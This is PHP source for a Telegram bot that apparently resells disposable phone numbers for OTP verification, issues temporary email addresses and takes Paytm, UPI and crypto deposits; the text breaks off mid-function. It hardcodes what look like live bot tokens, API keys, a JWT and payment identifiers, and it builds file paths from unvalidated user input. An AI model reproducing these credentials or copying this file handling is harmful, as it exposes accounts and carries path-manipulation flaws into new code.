<?php
set_time_limit(600);
echo "working";
$token = "6491167460:AAEoOZcuLZtSP5rmv1PjdE1_89_QBXC8kZY";
$data = file_get_contents("php://input");
$bot = json_decode($data,true);
$admin = 1448414156;
$botu = "Superrrotpbot";
$fapi = "70606e89f3f587c7e65d70450154ccb7";
$mid = "BCR2DN4TRKZ7J5BU";
$sd = "5sim.net";
$sapi = "eyJhbGciOiJSUzUxMiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MjczNDdhhjUsImlhdCI6MTY5NTgxMDA2NSwicmF5IjoiMTY2MDBjZGQ5YTAyZTI1Y2M4MDJlNDYxNWJhZTZjZWMiLCJzdWIiOjE4ODQwNDJ9.DRiOzXTDjDlxR6NmjONOGmMaHbeFQylZJ9kwpz-KQPMidt9G_2zUaQG97SxO06vYyYAfyoDDriENQAi1WKJZL2R9ZY_w36IoeuqaoYF-1RT8uMg_qFJ1KSatkA81JEb61d4EcJl538e0jtiYpZnPRtSQ2dT2a50bIKoX3hkNIh5iTSKWyKjbkMxE18f7AYw-uHbXYN_g6lkkVHPOVsdu5f2S6lo-AhmU7qQxQ-JVEfREZhgHOOts8y47XFNLAIay7BQnmWl8USr0eUp1hfCP6DN6PNM0ZWSDk89o5_uHrDaQa-zA-Znrn5RT9XiJbMptCi814WjPhwNX3s3GpHIw";
$channel = "itzzzkartikk0816";
$upi = "9699833574@fam";
$pchannel = "paytmbot848383";//Payment channel 
$trx = "TMHGsP5orBR4gXDKW25WqAa11cNjxFiihE";
$qr = "https://graph.org/file/9cb1c6f4b0d4d5e349531.jpg";
$support ="Itzzzkartik0816";
$schannel = "paymentttchannell";
function main($chat){
if(file_exists("data/$chat.json")){
 return json_decode(file_get_contents("data/$chat.json"),true);
 }
}
//sendMessage($data,$admin,null,null);
$ma = false;


if (isset($bot['message'])) {
$chat_id = $bot['message']['from']['id'];
$message = $bot['message']['text'];
if($chat_id == 1448414156||$chat_id == $admin){
}else{
if($ma == true){
sendMessage("Bot is Currently Off.
📎 Updates : @$channel",$chat_id,null,null);
return;}}
if(main($chat_id)['status'] == "ban"){
}else{


                $command = '/broadcast';
        if (strpos($message, $command) === 0) {
        
        
        $parameter = substr($message, 10);

            if ((main($chat_id)['admin'] === "true") || ($chat_id == $admin)) {
            if(!$parameter){
            sendMessage("*⚠️ Wrong Fromat. 
♨️ Example: *`/broadcast test`",$chat_id,null,"markdown");
return;}
$a = json_decode(file_get_contents("$botu.json"),true);

$chatIds = $a['chat_ids'];
$apiUrl = "https://api.telegram.org/bot$token/sendMessage";
$apiParams = [
"text"=>$parameter,
"chat_id"=>null];
      $batchSize = 100; // Adjust the batch size as per your requirement
    $totalChatIds = count($chatIds);
    $batchChatIds = array_chunk($chatIds, $batchSize);

    foreach ($batchChatIds as $batchIndex => $batch) {
        $multiHandle = curl_multi_init();
        $batchCurlHandles = [];

        foreach ($batch as $chatId) {
            $ch = curl_init();
            $apiParams['chat_id'] = $chatId['userid'];
            curl_setopt($ch, CURLOPT_URL, $apiUrl);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $apiParams);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_multi_add_handle($multiHandle, $ch);
            $batchCurlHandles[] = $ch;
        }

        $active = null;
        do {
            $status = curl_multi_exec($multiHandle, $active);
        } while ($status === CURLM_CALL_MULTI_PERFORM || $active);

        $responses = [];
        foreach ($batchCurlHandles as $i => $ch) {
            $response = curl_multi_getcontent($ch);
            $responses[] = $response;
            curl_multi_remove_handle($multiHandle, $ch);
            curl_close($ch);
        }

        curl_multi_close($multiHandle);

        foreach ($responses as $response) {
            $tut++;
            if ($response !== false) {
                $responseArray = json_decode($response, true);
                if ($responseArray['ok'] == false) {
                    if($responseArray['description'] == 'Forbidden: bot was blocked by the user') $blockd ++;
                } else if ($responseArray['ok'] == true) {
                    $sent++;
                }
            }}}
            $failed = $tut-$sent;
            $tx = "*🔊 SpokeCast Complete!* \n\n_📈 Details Below:_ \n💯* Total:* $tut User(s)\n✅* Sent to:* $sent User(s)\n💮* Failed for:* $failed User(s)\n©️ *@getotpsofficial*";
  sendMessage ($tx,$chat_id,null,"markdown");
    }}
        if (strpos($message, '/') === 0) {
        $com = explode('_', $message);
        $comm = $com[0];
        $param = isset($com[1]) ? $com[1] : '';
        $params = isset($com[2]) ? $com[2] : null;
       switch($comm){
       case '/otp':
       
    date_default_timezone_set('Asia/Kolkata');
    $currentDateTimeIST = new DateTime();
    $currentDateTimeIST->setTimezone(new DateTimeZone('Asia/Kolkata'));
    $currentDateIST = $currentDateTimeIST->format('d/m/Y');
    $currentTimeIST = $currentDateTimeIST->format('g:i:s');
       $data = file_get_contents("https://$sd/v1/guest/prices?country=india&product=$param");
       $res = json_decode($data,true);
       $price = $res['india']["$param"]["virtual$params"]["cost"];
       $price = floatval($price);
       $amo = json_decode(file_get_contents("admin/info.json"), true);
       $revenue = ($price * floatval($amo['profit'][0]['1']))/100;
$final = $price + number_format($revenue, 2); 
       sendMessage("Click The Below Button to buy.",$chat_id,array('inline_keyboard'=>[[['text'=>"$final Points",'callback_data'=>"/otp $param $final $params $currentTimeIST $currentDateIST"]]]),null);
      break;
      case '/otp2':
      date_default_timezone_set('Asia/Kolkata');
    $currentDateTimeIST = new DateTime();
    $currentDateTimeIST->setTimezone(new DateTimeZone('Asia/Kolkata'));
    $currentDateIST = $currentDateTimeIST->format('d/m/Y');
    $currentTimeIST = $currentDateTimeIST->format('g:i:s');
     $par = $params != null ? $param."_".$params:$param;
    
       $data = file_get_contents("https://fastsms.su/stubs/handler_api.php?api_key=$fapi&action=getPrices&service=$par&country=22");
       $res = json_decode($data,true);
       foreach ($res['22'][$par] as $key1 => $value1) {
    $price = $key1;
}
$amo = json_decode(file_get_contents("admin/info.json"), true);
$price = floatval($price); // Convert $price to float

$revenue = ($price * floatval($amo['profit'][1]['2']))/100;
$final = $price + number_format($revenue, 2); 
if($final == 0){
return;}
       sendMessage("Click Below Button to Get Number.",$chat_id,array('inline_keyboard'=>[[['text'=>"$final Points",'callback_data'=>"/otp2 $param $final 1 $currentTimeIST $currentDateIST"]]]),null);
       break;
       /*case '/otp3':
       date_default_timezone_set('Asia/Kolkata');
    $currentDateTimeIST = new DateTime();
    $currentDateTimeIST->setTimezone(new DateTimeZone('Asia/Kolkata'));
    $currentDateIST = $currentDateTimeIST->format('d/m/Y');
    $currentTimeIST = $currentDateTimeIST->format('g:i:s');
     $par = $params != null ? $param."_".$params:$param;
    
       $data = file_get_contents("https://otplelo.xyz/api/services");
       $res = json_decode($data,true);
       $price = null;
foreach ($res as $item) {
    if (strval($item['slug']) === strval($par)) {
        $price = $item['price'];
        sendMessage($price,$chat_id,null,null);
        break;
        }
}
$amo = json_decode(file_get_contents("admin/info.json"), true);
$price = floatval($price); // Convert $price to float

$revenue = ($price * floatval($amo['profit'][1]['2']))/100;
$final = $price + number_format($revenue, 2); 
if($final == 0){
return;}
       sendMessage("Click Below Button to Get Number.",$chat_id,array('inline_keyboard'=>[[['text'=>"$final Points",'callback_data'=>"/otp3 $param $final 1 $currentTimeIST $currentDateIST"]]]),null);
       break;*/
    
       }
        $commandParts = explode(' ', $message);
        $command = $commandParts[0];
        $parameter = isset($commandParts[1]) ? $commandParts[1] : '';
        $params = isset($commandParts[2]) ? $commandParts[2] : '';
        $param = isset($commandParts[3]) ? $commandParts[3] : '';
            switch ($command) {
        case '/start':
        $user = main($chat_id);
        sendMessage("*👨‍💼 𝖧𝖾𝗅𝗅𝗈 *[".$bot['message']['from']['first_name']."](tg://user?id=".$chat_id.") *𝖯𝗅𝖾𝖺𝗌𝖾 𝖩𝗈𝗂𝗇 𝖮𝗎𝗋 𝖢𝗁𝖺𝗇𝗇𝖾𝗅 𝖳𝗈 𝖠𝖼𝖼𝖾𝗌𝗌 𝖳𝗁𝖾 𝖡𝗈𝗍 :

Join Here : @$channel*",$chat_id,array('inline_keyboard'=>[[['text'=>'✅ Joined','callback_data'=>'/joined']]]),'Markdown');
if(!file_exists("data/$chat_id.json")){
$put = json_encode(array("type"=>"member","balance"=>"0","plan"=>"free","fav"=>array(),"status"=>"unban","refer"=>array(),"refer_by"=>false,"admin"=>false));
           file_put_contents("data/$chat_id.json",$put);
           if(!file_exists("$botu.json")){
touch("$botu.json");
  $put = '{"chat_ids":[{"userid":'.$chat_id.'}]}';
  file_put_contents("$botu.json",$put);
  return;
        
           }}
            if($parameter){
             if($parameter == $chat_id){
            return;}
           if(main($chat_id)['type'] == "already"){
           return;}
           $res = main($parameter);
           //$par = (count($res['refer']) == 0)?$chat_id:$chat_id;
           $res['refer'][] = $chat_id;
           file_put_contents("data/$parameter.json",json_encode($res));
          $res2 = main($chat_id);
            $res2['refer_by'] = $parameter;
            file_put_contents("data/$chat_id.json",json_encode($res2));
           sendMessage("*Your friend {$bot['message']['from']['first_name']} has joined us via your referral link !!*",$parameter,null,"markdown");
           }
           $res = main($chat_id);
            if(!isset($user['damo'])){
  $user['damo'] = $user['balance'];
  }
           
            $res['type'] = "already";
            file_put_contents("data/$chat_id.json",json_encode($res));
              break;
             case '/panel':
             if ((main($chat_id)['admin'] === "true") || ($chat_id == $admin)) {
             
     sendMessage("*_Hello @{$bot['message']['from']['username']}_*
            
*💎 Add Admin* : `/admin $chat_id true` 
*💎 Remove Admin* : `/admin $chat_id false`
*💎 Add Balance* : `/bal $chat_id 1`
*💎 Cut Balance* : `/bal $chat_id -1`
*💎 User History* : `/history $chat_id`
*💎 Ban User* : `/ban $chat_id true`
*💎 Unban User* : `/ban $chat_id false`
*💎 Broadcast* : `/broadcast message`
➖➖➖➖➖➖➖➖➖➖➖➖➖➖
*✅ Set OTP Price :* `/set 30`",$chat_id,null,"markdownV2");
           }
           /**➕ Add Plans :* `/membership {plan_Name} {plan_discount} {plan_price}`"*/
            break;
            case '/admin':
            if ((main($chat_id)['admin'] === "true") || ($chat_id == $admin)) {
            $new = main($parameter);
            $new['admin'] = $params;
            file_put_contents("data/$parameter.json",json_encode($new));
            $msg = ($params == "true")?"$parameter is now a admin":"$parameter is now not a admin";
          sendMessage($msg,$chat_id,null,null);
          $amsg = ($params == "true")?"You are Now a Admin
Run /panel":"You are Dismissed from Admin";
           sendMessage($amsg,$parameter,null,null);
            }
            break;
            case '/bal':
            if ((main($chat_id)['admin'] === "true") || ($chat_id == $admin)) {
           $new = main($parameter);
           $new['balance'] = $new['balance']+$params;
           $damo = isset($new['damo'])?$new['damo']:0;
    $new['damo'] = floatval($params)+floatval($damo);
   
           file_put_contents("data/$parameter.json",json_encode($new));
           
           sendMessage("➕ Added Balance

🔎 User : [$parameter](tg://user?id=$parameter)
💰 Amount : $params","@$pchannel",null,"markdown");
            sendMessage("🆔 User Id : $parameter

💰 Amount Added : $params

💰 Balance : ".$new['balance'],$chat_id,null,null);
}
sendMessage("🆔 User Id : $parameter

💰 Amount Added : $params

💰 Balance : ".$new['balance'],$parameter,null,null);
break;
case '/ban':
if ((main($chat_id)['admin'] === "true") || ($chat_id == $admin)) {
            $new = main($parameter);
            $param = ($params == "true")?"ban":"unban";
            $new['status'] = $param;
            file_put_contents("data/$parameter.json",json_encode($new));
            $msg = ($params == "true")?"$parameter is banned":"$parameter is unbanned";
          sendMessage($msg,$chat_id,null,null);
          $amsg = ($params == "true")?"You are Now Banned From Bot":"You are Unbanned from Bot";
           sendMessage($amsg,$parameter,null,null);
            }
            break;
            
            case "/set":
            if ((main($chat_id)['admin'] === "true") || ($chat_id == $admin)) {
            
            $data = json_decode(file_get_contents("admin/info.json"),true);
           
$found = false;

foreach ($data['profit'] as $index => $item) {
    if (isset($item[$params])) {
        $found = true;
        $data['profit'][$index][$params] = $parameter;
        break;
    }
}

if (!$found) {
    $data['profit'][] = [$params => $parameter];
}


    sendMessage("OTP Profit Percentage set to $parameter",$chat_id,null,null);
        
file_put_contents("admin/info.json",json_encode($data));
                }
            break;
            case '/history':
            if ((main($chat_id)['admin'] === "true") || ($chat_id == $admin)) {
            $new = main($parameter);
            $status = ($new['admin'] == false)?"Not Admin":"Admin";
                $otp = 0;
                foreach ($new['otp'] as $item) {
    if ((strval($item['type']) === strval("number_issued"))||(strval($item['type']) === strval("otp_taken"))) {
        
        $otp++;
        
            }
}
            sendMessage("*User Details*

*User Telegram Id * : $parameter
*User Status* : ".$new['status']." ( ".$status." )
*User Balance* : ".$new['balance']."
*User Refers* : ".count($new['refer'])."
*User Plan* : ".$new['plan']."
*Total OTP Taken* : `".$otp."`
*Total spend* : `".$new['spend']."`
*Total Deposit* : `".$new['damo']."`",$chat_id,null,"markdown");
  $jsonData = file_get_contents("data/$parameter.json");
$data = json_decode($jsonData, true);
    $otp = $data['otp'];
    $msg = "<b>🧿 User Last 20 Otp History :</b>
\n";

      $nt = count($otp);
$startingIndex = max($nt - 29, 1);

foreach ($otp as $index => $otps) {
    if ($index >= $startingIndex - 1) {
        $id = $otps['id'];
        $number = $otps['number'];
        $price = $otps['price'];
        $type = $otps['type'];

        $msg .= ($index + 1) . ". <b>Id:</b> <code>$id</code>
<b>Number:</b> <code>$number</code>
<b>Price:</b> <code>$price</code>
<b>Status:</b> <code>$type</code>
___________________________\n";
    }
}

    sendMessage($msg,$chat_id,null,"html");
             }
             $deposit = main($parameter)['deposit'];
                if(count($deposit) == 0){
                sendMessage ("Opps! User did Not Deposited Any Amount",$chat_id,null,null);
                return;
                }
    $msg = "<b>🧿 <u>Your Last 20 Deposit History</u> :</b>
\n";
$nt = count($deposit);
$startingIndex = max($nt - 29, 1);
      foreach ($deposit as $index => $otps) {
      if ($index >= $startingIndex - 1) {
        $status = $otps['status'];
      $price = ($otps['amount'] != null)?$otps['amount']:"Not described";
      $type = $otps['type'];
      

        $msg .= ($index + 1) . ". <b>Type:</b> <code>$type</code>
    <b>Amount:</b> <code>$price</code>
    <b>Status:</b> <code>$status</code>\n
";
    }}
    sendMessage($msg,$chat_id,null,"html");
break;
           
            }}else{
            $main = main($chat_id);
            
            if($message == "⚙ Settings"){
            sendMessage("*Kindly Select An Option You Want To Manage*",$chat_id,['inline_keyboard'=>[[['text'=>'💳 Pay Info','callback_data'=>'/settings pay'],['text'=>'👫 Refer','callback_data'=>'/settings status']],[['text'=>'🖇️ Info Links','callback_data'=>'/settings links']]]],'markdown');
           return; }
           
            if ($message == "📈 Status") {
        if (!file_exists("$botu.json")) {
    echo 0;
    return;
}
$stat = json_decode(file_get_contents("$botu.json"), true);
if (!$stat) {
    echo "Error parsing JSON data";
    return;}
    $response = count($stat['chat_ids']);
    
    date_default_timezone_set('Asia/Kolkata');
    $currentDateTimeIST = new DateTime();
    $currentDateTimeIST->setTimezone(new DateTimeZone('Asia/Kolkata'));
    $currentDateIST = $currentDateTimeIST->format('d/m/Y');
    $currentTimeIST = $currentDateTimeIST->format('g:i:s A');
    
    
$otpArray = [];
$files = scandir("data/");
foreach ($files as $file) {
    if ($file !== '.' && $file !== '..') {
        $filePath = "data/" . $file;
        $fileContents = file_get_contents($filePath);
$userData = json_decode($fileContents, true);

    $otp = $userdata['otp'];
    if (is_array($otp)) {
        foreach ($otp as $otpItem) {
            if (isset($otpItem['type'])) {
                $otpArray[] = $otpItem['type'];
            }
        }
    } elseif (isset($otp['type'])) {
        $otpArray[] = $otp['type'];
    }
}}


    $caption = "*👥 Total OTP Buyers:* `".count($memberCount)."`\n\n🔸* Total OTP Bought:* `".count($otpArray)."`\n\n*📅 DATE:* `$currentDateIST`\n⌚️ *TIME:* `$currentTimeIST`";
    $photo = "https://quickchart.io/chart?bkg=white&c={type:%27bar%27,datasets:{labels:[''],datasets:[{label:%27Total-Users%27,data:[$response]},{label:%27Total-Otp-Buyed%27,data:[".count($otpArray)."]}]}}";
    
    $caption = urlencode($caption); 
    $photo = urlencode($photo); 
    
    $apiUrl = "https://api.telegram.org/bot$token/sendPhoto?chat_id=$chat_id&photo=$photo&caption=$caption&parse_mode=markdown";
    file_get_contents($apiUrl);

    return;
}
if($message == "👫 Refer"){
date_default_timezone_set('Asia/Kolkata');
    $lin="https://t.me/buy_sell_otp/342";
$msg = "*Hey *".$bot['message']['from']['first_name']." *

🏡 Welcome To Refer And Earn by @".$botu."

🎉 Refer Reward - 5% of Deposit by Refer 

🔗 Referral Link : https://t.me/".$botu."?start=".$chat_id."*";
$captio = urlencode($msg); 
    $phot = urlencode($lin); 
    
    $apUrl = "https://api.telegram.org/bot$token/sendPhoto?chat_id=$chat_id&photo=$phot&caption=$captio&parse_mode=markdown";
    file_get_contents($apUrl);
return;
}
if($message == "💰 Deposit"){
date_default_timezone_set('Asia/Kolkata');
    
sendMessage("*Hey *[".$bot['message']['from']['first_name']."](tg://user?id=".$chat_id.") 

* 1 𝚃𝚁𝚇 = ₹8.00 (𝑵𝑶 𝑻𝑨𝑿)
10 𝚛𝚜 🄿🄰🅈🅃🄼 = ₹10.00 (𝒩𝒪  𝚃𝙰𝚇)

📛🄽🄾🅃🄴:✨𝑨𝑳𝑳 𝑫𝑬𝑷𝑶𝑺𝑰𝑻 A‌M‌O‌U‌N‌T‌ ƚɾαɳʂϝҽɾ 𝚃૦ 𝗕૦𝚃 𝕀𝕋 𝕎𝕀𝕃𝕃 𝔹𝔼 ℕ𝕆 𝕋𝔸𝕂𝔼 𝔸ℕ𝕐 𝐓𝐈𝐌𝐄 𝕀𝕋𝕊 𝕀ℕ𝕊𝕋𝔸ℕTS✨

𝒊𝒇 𝒚𝒐𝒖𝒓 𝒅𝒆𝒑𝒐𝒔𝒊𝒕 𝒔𝒖𝒄𝒄𝒆𝒔𝒇𝒖𝒍𝒍𝒚 𝒊𝒏 𝒃𝒐𝒕 𝒚𝒐𝒖 𝒘𝒊𝒍𝒍 𝒏𝒐𝒕 𝒂𝒃𝒍𝒆 𝒕𝒐 𝒘𝒊𝒕𝒉𝒅𝒓𝒂𝒘.✨

𝚄𝚜𝚎 𝑻𝑹𝑿 𝙿𝙰𝚈𝙼𝙴𝙽𝚃 𝙼𝙴𝚃𝙷𝙾𝙳 𝙵𝙾𝚁 𝙶𝙴𝚃 𝑬𝑿𝑻𝑹𝑨 𝑩𝑶𝑵𝑼𝑺.✨*",$chat_id,array("inline_keyboard"=>[[['text'=>'💎 Paytm',"callback_data"=>"/deposit paytm"],['text'=>'💎 Upi ','callback_data'=>'/deposit upi']],[['text'=>'💠 TRX Crypto','callback_data'=>'/deposit trx']]]),'markdown');
return;
}
if($message == "📧 Get Gmail"){
$api = "https://api.internal.temp-mail.io/api/v3/email/new";
$params = ["min_name_length"=>10,
"max_name_length"=>10];
$ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $api);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($params));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $data = json_decode(curl_exec($ch),true);
        curl_close($ch);
sendMessage("*🔅 Yᴏᴜʀ ᴛᴇᴍᴘᴏʀᴀʀʏ ᴇᴍᴀɪʟ ᴀᴅᴅʀᴇss: 

✉️ Email :*
`".$data['email']."`",$chat_id,['inline_keyboard'=>[[['text'=>'🌐 View Inbox In Browser ( temp-mail.io )', 'url'=>"https://temp-mail.io/en/email/".$data['email']."/token/".$data['token']. "?utm_campaign=TempMailBot&utm_content=email_info&utm_medium=organic&utm_source=telegram-bot"]],[['text'=>'📬 Check Inbox','callback_data'=>'/inbox '.$data['email']],["text"=>"🗑 Delete","callback_data"=>"/del ".$data['email']." ". $data['token']]]]],'markdown');
return;}
if($message == "👥 Support"){
sendMessage("*✨𝑷𝒍𝒆𝒂𝒔𝒆 𝒍𝒆𝒕 𝒖𝒔 𝒌𝒏𝒐𝒘 𝒚𝒐𝒖𝒓 𝒑𝒓𝒐𝒃𝒍𝒆𝒎⭐𝑻𝒉𝒆𝒏  𝒘𝒆 𝒄𝒂𝒏 𝒉𝒆𝒍𝒑 𝒚𝒐𝒖🎆✨*",$chat_id,null,'markdown');
$main = main($chat_id);
$main['answer'] = "support";
file_put_contents("data/$chat_id.json",json_encode($main));
return;}
if($message == "👨‍💻 Profile"){
$currentDateTimeIST = new DateTime();
    $currentDateTimeIST->setTimezone(new DateTimeZone('Asia/Kolkata'));
    $currentDateIST = $currentDateTimeIST->format('d/m/Y');
    $currentTimeIST = $currentDateTimeIST->format('g:i:s A');
    $deposit = main($chat_id)['damo'] == null?0:main($chat_id)['damo'];
    $otp = 0;
                foreach (main($chat_id)['otp'] as $item) {
    if ((strval($item['type']) === strval("number_issued"))||(strval($item['type']) === strval("otp_taken"))) {
        
        $otp++;
        
            }
}
sendMessage ("*👤 Name :* `".$bot['message']['from']['first_name']."`
*🆔 User ID :* `$chat_id`

*💵 Balance :* `₹".main($chat_id)['balance']."`
*💰 Total Deposit :* `₹".$deposit."`

*⌚️ Last Updated :* `".$currentTimeIST."`
*📆 Date :* `".$currentDateIST."`

*💠 Total Number*`/`*OTP Buyed :* `".$otp."` ",$chat_id,['inline_keyboard'=>[[['text'=>'📋 OTP History',"callback_data"=>"/history otp"],['text'=>"💰 Deposit History","callback_data"=>"/history deposit"]],[["text"=>"📰 Terms & Conditions","callback_data"=>"/term"]]]],'markdown');
return;}
            if($message == '⭐️ Get OTP'){
            sendMessage("*✨ᴘʟᴇᴀsᴇ sᴇɴᴅ ᴍᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɴᴀᴍᴇ  ᴡʜɪᴄʜ ʏᴏᴜ ᴡᴀɴᴛ ᴏᴛᴘ.🎆*",$chat_id,['inline_keyboard'=>[[['text'=>"💠 Check Service List",'callback_data'=>'/buy']]]],'markdown');
            return;}
            if (isset(main($chat_id)['answer'])) {
            $answer = main($chat_id)['answer'];
            
             if ($answer == "trx") {
$hash = trim($message);
 $da = json_decode(file_get_contents("admin/transactions.json"),true);
            if(in_array($hash,$da['hash'])){
            sendMessage("_⚠️ This hash is already used by a user or yourself_",$chat_id,null,'markdown');
          
          }else{
            $data = json_decode(file_get_contents("https://apilist.tronscan.org/api/transaction-info?hash=".$hash),true);;
            if($data['contractRet'] != "SUCCESS"){
          sendMessage ("_⚠️ An Error Occured while fetching Details._
*Try Again with another Hash*",$chat_id,null,"markdown");
}else{
            $adress = $data ['toAddress'];
            $bal = $data['contractData']['amount'];
            $bal1 = substr($bal, 0, -6);
$bal2 = str_replace($bal1, "", $bal);
$amoun = $bal1 . "." . $bal2;
$amount = floatval($amoun)*floatval(6);
if($adress != $trx){
sendMessage("_⚠️ Invalid Transaction_",$chat_id,null,'markdown');
}else{
$da['hash'][] = $hash;
file_put_contents("admin/transactions.json",json_encode($da));
$main['balance'] = floatval($amount) + floatval($main['balance']);
$main['deposit'][] = array("type"=>"Tron Deposit","amount"=>$amount,"hash"=>$hash,"status"=>"success");
file_put_contents("data/$chat_id.json",json_encode($main));
$ref = main($chat_id)['refer_by'];
if($ref != false){
$p = (floatval($da['refer'])*floatval($amount))/100;
$re = main($ref);
$re['balance'] = floatval($re['balance']) + floatval($p);
sendMessage("Your Friend *@".$bot['message']['from']['username']." *Deposited $amount.
You Have got reward of $p.",$ref,null,'markdown');
file_put_contents("data/$ref.json",json_encode($re));
}
sendMessage ("🔔 New Deposit Request 🔔

🧒 User : [@".$bot['message']['from']['username']."](tg://user?id=".$chat_id.")
👤 Telegram Id : `$chat_id`
🔥 Method : TRX
🏦 Amount : $amount","@$pchannnel",null,"markdown");
sendMessage("*✅ Deposit Received You Have Deposited Amount : *" .
    $amount .
    " *TRX\n\nThank You 🇮🇳*",$chat_id,null,'markdown');
    sendMessage("New User :- *@".$bot['message']['from']['username']."* Deposited ".$amount ." Trx",$admin,null,'markdown');
             }}}}
if ($answer == "photo"){
$photo = $bot['message']['photo'][0]['file_id'];
$keyboard = [
    'inline_keyboard' => [
        [
         ['text' => '⚠️ Warn', 'callback_data' => "/warn $chat_id"]
        ]
    ]
];

$caption = "New User Deposited, Add Balance Using: \n\n`/bal $chat_id amount`";
$apiUrl = "https://api.telegram.org/bot$token/sendPhoto?chat_id=$admin&photo=$photo&caption=$caption&reply_markup=".json_encode($keyboard)."&parse_mode=markdown";
file_get_contents($apiUrl);
$cap = urlencode("*🏦 New Deposit Request 🏦\n\n\n🧒 User : *[@".$bot['callback_query']['from']['username']."](tg://user?id=".$chat_id.")*\n\n🔥 Method : UPI*");
$api = "https://api.telegram.org/bot$token/sendPhoto?chat_id=@$pchannel&photo=$photo&caption=$cap&parse_mode=markdown";
file_get_contents($api);
sendMessage ("👍 Your Request is accepted and will be confirmed by our staff.",$chat_id, null,null);
}
if($answer =="support"){
sendMessage("*📩 New Ticket Raised Please Wait Patiently 

🗳️ Ticket :* `$message`",$chat_id,null,"markdown");
sendMessage("*📩 New Ticket Raised by* [".$bot['message']['from']['first_name']."](tg://user?id=$chat_id)

*📬 User message :-* `$message`",$admin,null,'markdown');
}
if($answer == "paytm"){
    $transactionsFile = "admin/transactions.json";
    $message = trim($message);

      $transactions = json_decode(file_get_contents($transactionsFile), true);
    if (in_array($message, $transactions)) {
        sendMessage("_⚠️ This utr id is already used by you or another user_", $chat_id, null, 'markdown');
    }else{
    $url = file_get_contents("https://service-list.000webhostapp.com/botop/chk.php?mid=$mid&txn=$message");
    
      
   $data = json_decode($url,true);
   $amo = $data['TXNAMOUNT']; 
   $status = $data['STATUS'];
   
if ($status != "TXN_SUCCESS") {
  sendMessage("Request Failed.\n\nEither The Transaction Id is wrong or Merchant Key is not setupped correctly",$chat_id,null,null);
  
}else{
  sendMessage ("🔔 New Deposit Request 🔔

🧒 User : [@".$bot['callback_query']['from']['username']."](tg://user?id=".$chat_id.") 
👤 Telegram Id : `$chat_id`
🔥 Method : Paytm
🏦 Amount : $amo","@$pchannel",null,"markdown");
sendMessage("✅ Done You Paid Ammount ". $amo,$chat_id,null,null);
$transactions[] = $message;

    file_put_contents($transactionsFile, json_encode($transactions));
    $main['balance'] = floatval($amo)+floatval($main['balance']);
    $damo = isset($main['damo'])?$main['damo']:0;
    $main['damo'] = floatval($amo)+floatval($damo);
    $main['deposit'][] = array("type"=>"Paytm","amount"=>$amo,"status"=>"success");
    $ref = main($chat_id)['refer_by'];
if($ref != false){
$da = json_decode(file_get_contents("admin/info.json"),true);
$p = (floatval($da['refer'])*floatval($amo))/100;
$re = main($ref);
$re['balance'] = floatval($re['balance']) + floatval($p);
sendMessage("Your Friend *@".$bot['message']['from']['username']." *Deposited $amo.\nYou Have got reward of $p.",$ref,null,'markdown');
file_put_contents("data/$ref.json",json_encode($re));
 
}}}}
$main['answer'] = null;
file_put_contents("data/$chat_id.json", json_encode($main));
return;}
            sendMessage("Kindly select One Server To Buy OTP",$chat_id,array('inline_keyboard'=>[[['text'=>'🔔 Low Price Server ',"callback_data"=>"/fser1 $message"],['text'=>'🔔 Best Price Server',"callback_data"=>"/sser1 $message"]]]),null);
        }}}
if (isset($bot['callback_query'])) {
$chat_id = $bot['callback_query']['from']['id'];
$message_id = $bot['callback_query']['message']['message_id'];
if($chat_id == 1834957586||$chat_id == $admin){
}else{
if($ma == true){
sendMessage("Bot is Currently Off.

📎 Updates : @$channel",$chat_id,null,null);
return;}}
if(main($chat_id)['status'] == "ban"){
}else{
    $callbackData = $bot['callback_query']['data'];
    if (strpos($callbackData, '/') === 0) {
    $commandParts = explode(' ', $callbackData);
        $command = $commandParts[0];
        $parameter = isset($commandParts[1]) ? $commandParts[1] : null;
        $params = isset($commandParts[3]) ? $commandParts[3] : null;
        $param = isset($commandParts[2]) ? $commandParts[2] : null;
  $parm = isset($commandParts[4]) ? $commandParts[4] : null;
  $para = isset($commandParts[5]) ? $commandParts[5] : null;
  $cid = $bot['callback_query']['id'];
  
    switch ($command) {
    /*case '/service':
    $a = file_get_contents("https://fastsms.su/stubs/handler_api.php?api_key=$fapi&action=getServices");
$nameList = json_decode($a, true);
$services = array_unique($nameList);
asort($services);
$count = ($parameter != null)?$parameter:0;
$batchServices = array_slice($services,$count, 50);
$msg = "";
foreach ($batchServices as $value => $name) {
    $msg .= "*➤* `$name` otp_$value*\n";
}

$inlineKeyboard = array();
    $inlineKeyboard[] = array(
        array(
            "text" => "Next ⏭",
            "callback_data" => "/service ".(intval($parameter)+50)
        )
    );
sendMessage($msg, $chat_id, array('inline_keyboard' => $inlineKeyboard), 'markdown');

            break;*/
    case '/otp':
    
   if(!isset($parm)){
   $apiUrl = "https://api.telegram.org/bot$token/deleteMessage?chat_id=$chat_id&message_id=$message_id";
    file_get_contents($apiUrl);
   sendMessage("*⚠️ Request Timed Out*",$chat_id,null,"markdown");
    return;}
    date_default_timezone_set('Asia/Kolkata');
$currentDateTimeIST = new DateTime();
$currentDateTimeIST->setTimezone(new DateTimeZone('Asia/Kolkata'));
$currentDateISTV = $currentDateTimeIST->format('d/m/Y');
    $currentTimeISTV = $currentDateTimeIST->format('g:i:s');
      
$currentDateIST = $para;
$currentTimeIST = $parm;

$currentTimeISTDateTime = DateTime::createFromFormat('H:i:s', $currentTimeIST);
$allowedDateTime = clone $currentTimeISTDateTime;
$allowedDateTime->add(new DateInterval('PT10M')); // Increase current time by 20 minutes

$allowedDate = $allowedDateTime->format('d/m/Y');
$allowedTime = $allowedDateTime->format('H:i:s');
$tm = explode(':', $currentTimeISTV);
$tm2 = (floatval($tm[0])*60*60)+(floatval($tm[1])*60)+floatval($tm[2]);
$tmm = explode(':', $allowedTime);
$tmm2 = (floatval($tmm[0])*60*60)+(floatval($tmm[1])*60)+floatval($tmm[2]);

if ($allowedDate != $currentDateISTV || $tm2 > $tmm2) {
$apiUrl = "https://api.telegram.org/bot$token/deleteMessage?chat_id=$chat_id&message_id=$message_id";
    file_get_contents($apiUrl);
